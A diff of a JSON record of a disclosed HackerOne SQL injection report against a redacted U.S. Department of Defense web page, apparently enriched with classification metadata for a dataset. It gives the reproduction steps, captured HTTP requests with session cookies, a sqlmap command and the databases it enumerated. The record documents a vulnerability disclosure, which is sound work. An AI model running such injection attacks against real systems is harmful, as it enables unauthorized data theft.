@@ -1,46 +1,50 @@
 {
-    "reported_to": "U.S. Dept Of Defense",
-    "reported_by": "haxor31337 ",
-    "title": "SQL Injection at https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588.asp (\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588) [selMajcom] [HtUS]",
-    "content": "\nSummary:\nSQL injection (SQLi) is a vulnerability in which an application accepts input into an SQL statement and treats this input as part of the statement. Typically, SQLi allows a malicious attacker to view, modify or delete data that should not be able to be retrieved. An SQLi vulnerability was found for this host which allows an attacker to execute code and view data from the SQL service by submitting SQL queries.\nAn attacker could exploit this lack of input sanitization to exfiltrate database data and files, tamper with the data, or perform resource exhaustion. Depending on the database and how it is configured, an attacker could potentially remotely execute code on the server running the database.\nI found SQL Injection at https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588.asp allowing attacker can exfiltrate database and leak sensitive data of \u2588\u2588\u2588\u2588\u2588\u2588\u2588 without authentication.\nSteps To Reproduce:\nAccess to https://\u2588\u2588\u2588\u2588.asp Create an user, after create go to https://\u2588\u2588\u2588\u2588.asp\nCapture request on burpsuite with the following request\nCode 685 Bytes\n1GET /\u2588\u2588\u2588\u2588\u2588mil/AFServices/RequestAccess.asp?selMajcom=MAT*&selbase=MXRD&Submitted=1&Appid=29&FuncID=23&App=Activity+Database+FMP HTTP/1.1\n2Host: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588.\u2588\u2588\u2588\u2588.net:443\n3Cookie: ebsprod=7nchaAqvaxeCArcwSjtyE0HiG4; ASPSESSIONIDQQBSACRQ=MPHFFIECABOOKHDLEIEEOAHA\n4User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0\n5Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\n6Accept-Language: vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3\n7Accept-Encoding: gzip, deflate\n8Dnt: 1\n9Upgrade-Insecure-Requests: 1\n10Sec-Fetch-Dest: document\n11Sec-Fetch-Mode: navigate\n12Sec-Fetch-Site: none\n13Sec-Fetch-User: ?1\n14Te: trailers\n15Connection: close\n16\nInject SQL query to vulnerable parameter selMajcom\nSave request to file dod.txt\nCode 546 Bytes\n1GET /\u2588\u2588\u2588\u2588\u2588\u2588mil/AFServices/RequestAccess.asp?selMajcom=MAT*&selbase=MXRD&Submitted=1&Appid=29&FuncID=23&App=Activity+Database+FMP HTTP/1.1\n2Host: \u2588\u2588\u2588.\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588.net:443\n3Cookie: ebsprod=7nchaAqvaxeCArcwSjtyE0HiG4; ASPSESSIONIDQQBSACRQ=MPHFFIECABOOKHDLEIEEOAHA\n4User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0\n5Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\n6Accept-Language: vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3\n7Accept-Encoding: gzip, deflate\n8Connection: close\n9\nAttack automation with sqlmap command\nCode 54 Bytes\n1python sqlmap.py -r dod.txt --dbs --level 3 risk 3 -v3\nSupporting Material/References:\n\u2588\u2588\u2588\u2588\u2588\nCode 346 Bytes\n1available databases [24]:\n2[*] ActivityManager\n3[*] AFMajcomBases\n4[*] AFNAF\n5[*] AFServicesUsers\n6[*] AFSponsorship\n7[*] AssetsAndLiabilities\n8[*] BaseProjects\n9[*] BEFT\n10[*] CGO\n11[*] EICSQL\n12[*] master\n13[*] model\n14[*] msdb\n15[*] NAFDIS\n16[*] NAFRIS_restore\n17[*] ORCA\n18[*] Property\n19[*] RMD\n20[*] \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n21[*] tempdb\n22[*] TSD\n23[*] Unemployment\n24[*] VMS_Test\n25[*] W2DATA\nImpact\nData exfiltration through a SQLi attack could lead to reputational damage or regulatory fines for the business due to an attacker\u2019s unauthorized access to data. This could also result in reputational damage for the business through the impact to customers\u2019 trust. The severity of the impact to the business is dependent on the sensitivity of the data being stored in, and transmitted by the application.\nLeak sensitive data on \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 service.\n\n",
-    "severity": [
-        9.0,
-        10.0
+  "reported_to": "U.S. Dept Of Defense",
+  "reported_by": "haxor31337 ",
+  "title": "SQL Injection at https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588.asp (\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588) [selMajcom] [HtUS]",
+  "content": "\nSummary:\nSQL injection (SQLi) is a vulnerability in which an application accepts input into an SQL statement and treats this input as part of the statement. Typically, SQLi allows a malicious attacker to view, modify or delete data that should not be able to be retrieved. An SQLi vulnerability was found for this host which allows an attacker to execute code and view data from the SQL service by submitting SQL queries.\nAn attacker could exploit this lack of input sanitization to exfiltrate database data and files, tamper with the data, or perform resource exhaustion. Depending on the database and how it is configured, an attacker could potentially remotely execute code on the server running the database.\nI found SQL Injection at https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588.asp allowing attacker can exfiltrate database and leak sensitive data of \u2588\u2588\u2588\u2588\u2588\u2588\u2588 without authentication.\nSteps To Reproduce:\nAccess to https://\u2588\u2588\u2588\u2588.asp Create an user, after create go to https://\u2588\u2588\u2588\u2588.asp\nCapture request on burpsuite with the following request\nCode 685 Bytes\n1GET /\u2588\u2588\u2588\u2588\u2588mil/AFServices/RequestAccess.asp?selMajcom=MAT*&selbase=MXRD&Submitted=1&Appid=29&FuncID=23&App=Activity+Database+FMP HTTP/1.1\n2Host: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588.\u2588\u2588\u2588\u2588.net:443\n3Cookie: ebsprod=7nchaAqvaxeCArcwSjtyE0HiG4; ASPSESSIONIDQQBSACRQ=MPHFFIECABOOKHDLEIEEOAHA\n4User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0\n5Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\n6Accept-Language: vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3\n7Accept-Encoding: gzip, deflate\n8Dnt: 1\n9Upgrade-Insecure-Requests: 1\n10Sec-Fetch-Dest: document\n11Sec-Fetch-Mode: navigate\n12Sec-Fetch-Site: none\n13Sec-Fetch-User: ?1\n14Te: trailers\n15Connection: close\n16\nInject SQL query to vulnerable parameter selMajcom\nSave request to file dod.txt\nCode 546 Bytes\n1GET /\u2588\u2588\u2588\u2588\u2588\u2588mil/AFServices/RequestAccess.asp?selMajcom=MAT*&selbase=MXRD&Submitted=1&Appid=29&FuncID=23&App=Activity+Database+FMP HTTP/1.1\n2Host: \u2588\u2588\u2588.\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588.net:443\n3Cookie: ebsprod=7nchaAqvaxeCArcwSjtyE0HiG4; ASPSESSIONIDQQBSACRQ=MPHFFIECABOOKHDLEIEEOAHA\n4User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0\n5Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\n6Accept-Language: vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3\n7Accept-Encoding: gzip, deflate\n8Connection: close\n9\nAttack automation with sqlmap command\nCode 54 Bytes\n1python sqlmap.py -r dod.txt --dbs --level 3 risk 3 -v3\nSupporting Material/References:\n\u2588\u2588\u2588\u2588\u2588\nCode 346 Bytes\n1available databases [24]:\n2[*] ActivityManager\n3[*] AFMajcomBases\n4[*] AFNAF\n5[*] AFServicesUsers\n6[*] AFSponsorship\n7[*] AssetsAndLiabilities\n8[*] BaseProjects\n9[*] BEFT\n10[*] CGO\n11[*] EICSQL\n12[*] master\n13[*] model\n14[*] msdb\n15[*] NAFDIS\n16[*] NAFRIS_restore\n17[*] ORCA\n18[*] Property\n19[*] RMD\n20[*] \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n21[*] tempdb\n22[*] TSD\n23[*] Unemployment\n24[*] VMS_Test\n25[*] W2DATA\nImpact\nData exfiltration through a SQLi attack could lead to reputational damage or regulatory fines for the business due to an attacker\u2019s unauthorized access to data. This could also result in reputational damage for the business through the impact to customers\u2019 trust. The severity of the impact to the business is dependent on the sensitivity of the data being stored in, and transmitted by the application.\nLeak sensitive data on \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 service.\n\n",
+  "severity": [
+    9.0,
+    10.0
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "SQL Injection"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1673049360,
+  "report_url": "https://hackerone.com/reports/1628408",
+  "is_multi_component": false,
+  "complexity": "MEDIUM",
+  "novelty": "LOW",
+  "vuln_category": "WEB_APP",
+  "steps": [
+    [
+      1,
+      "Access https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588.asp and create a user account."
     ],
-    "bounty": null,
-    "weaknesses": [
-        "SQL Injection"
+    [
+      2,
+      "Capture the request in Burp Suite after creating the user and modify the 'selMajcom' parameter to inject a SQL query."
     ],
-    "screenshots": {},
-    "disclosed_date": 1673049360,
-    "report_url": "https://hackerone.com/reports/1628408",
-    "is_multi_component": false,
-    "complexity": "MEDIUM",
-    "novelty": "LOW",
-    "vuln_category": "WEB_APP",
-    "steps": [
-        [
-            1,
-            "Access https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588.asp and create a user account."
-        ],
-        [
-            2,
-            "Capture the request in Burp Suite after creating the user and modify the 'selMajcom' parameter to inject a SQL query."
-        ],
-        [
-            3,
-            "Save the modified request to a file (e.g., dod.txt) and use sqlmap to automate the attack: 'python sqlmap.py -r dod.txt --dbs --level 3 risk 3 -v3'."
-        ]
-    ],
-    "vuln_description": "SQL injection vulnerability in https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588.asp allows unauthenticated attackers to execute arbitrary SQL queries, potentially leading to data exfiltration, tampering, or remote code execution.",
-    "reason": "The vulnerability involves straightforward SQL injection via a single parameter (selMajcom) without requiring complex interactions or state manipulation. The attack follows common SQLi techniques and does not involve novel or subtle logic.",
-    "new_complexity": "LOW",
-    "requires_code": false,
-    "requires_CVE": false,
-    "is_ctf": false,
-    "other_report": null,
-    "authnz_metadata": {
-        "reason": "The SQL injection vulnerability involves direct manipulation of SQL queries through input parameters, which is not directly related to authentication or authorization bypass via session or user swapping. The methodology described focuses on testing authorization boundaries by swapping user sessions or resource IDs, not on input validation flaws like SQL injection.",
-        "is_detectable": false
-    }
+    [
+      3,
+      "Save the modified request to a file (e.g., dod.txt) and use sqlmap to automate the attack: 'python sqlmap.py -r dod.txt --dbs --level 3 risk 3 -v3'."
+    ]
+  ],
+  "vuln_description": "SQL injection vulnerability in https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588.asp allows unauthenticated attackers to execute arbitrary SQL queries, potentially leading to data exfiltration, tampering, or remote code execution.",
+  "reason": "The vulnerability involves straightforward SQL injection via a single parameter (selMajcom) without requiring complex interactions or state manipulation. The attack follows common SQLi techniques and does not involve novel or subtle logic.",
+  "new_complexity": "LOW",
+  "requires_code": false,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null,
+  "authnz_metadata": {
+    "reason": "The SQL injection vulnerability involves input sanitization issues in SQL queries, which is not directly related to authentication or authorization bypass through session or resource manipulation. The methodology described focuses on testing authorization boundaries by swapping user sessions or resource IDs, not on detecting input validation flaws.",
+    "is_detectable": false
+  },
+  "injection_metadata": {
+    "reasoning": "The SQL injection vulnerability was discovered through parameter manipulation in HTTP requests (selMajcom) using automated testing with sqlmap. The methodology's 'simple payload' approach matches this discovery since: 1) The parameter was identified through regular request logging, 2) SQLi detection used same-channel response analysis (HTTP errors/behavior), 3) No custom filter bypasses were mentioned in the report, and 4) Database enumeration was achieved through standard SQLi payloads without requiring external exfiltration channels.",
+    "is_simple_injection": true
+  }
 }
